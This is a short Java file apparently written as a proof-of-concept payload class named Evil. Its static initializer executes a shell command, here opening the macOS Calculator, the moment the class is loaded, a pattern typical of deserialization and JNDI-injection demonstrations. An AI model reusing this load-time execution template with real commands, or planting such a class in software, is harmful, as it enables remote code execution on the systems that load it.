package com.t4rrega.bean;

import java.io.IOException;

public class Evil {
    static {
        try {
            Runtime.getRuntime().exec("open -a Calculator.app");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
